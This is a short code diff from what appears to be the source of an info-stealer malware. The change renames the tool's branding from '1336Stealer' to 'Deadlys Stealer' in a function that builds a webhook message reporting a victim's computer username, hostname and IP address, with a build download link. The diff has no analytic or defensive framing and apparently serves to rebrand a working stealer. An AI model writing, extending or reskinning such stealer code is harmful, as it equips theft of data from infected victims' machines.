@@ -88,7 +88,7 @@ class Stat {
         if (link != "") {
             build += "\\n\\nDownload : " + link
         }
-        return `{\n"content": null,\n"embeds": [\n{\n"title": "Thanks for using 1336Stealer",\n"description": "` + build + `",\n"color": 3224376,\n"fields": [\n{\n"name": "Computer Username",\n"value": "` + username + `",\n"inline": true\n},\n{\n"name": "Hostname",\n"value": "` + hostname + `",\n"inline": true\n},\n{\n"name": "Ip",\n"value": "` + ip + `",\n"inline": true\n}\n],\n"author": {\n"name": "1336Stealer"\n}\n}\n],\n"username": "1336Stealer",\n"attachments": []\n}`
+        return `{\n"content": null,\n"embeds": [\n{\n"title": "Thanks for using Deadlys Stealer",\n"description": "` + build + `",\n"color": 3224376,\n"fields": [\n{\n"name": "Computer Username",\n"value": "` + username + `",\n"inline": true\n},\n{\n"name": "Hostname",\n"value": "` + hostname + `",\n"inline": true\n},\n{\n"name": "Ip",\n"value": "` + ip + `",\n"inline": true\n}\n],\n"author": {\n"name": "Deadly"\n}\n}\n],\n"username": "Deadly",\n"attachments": []\n}`
     }
 }
 
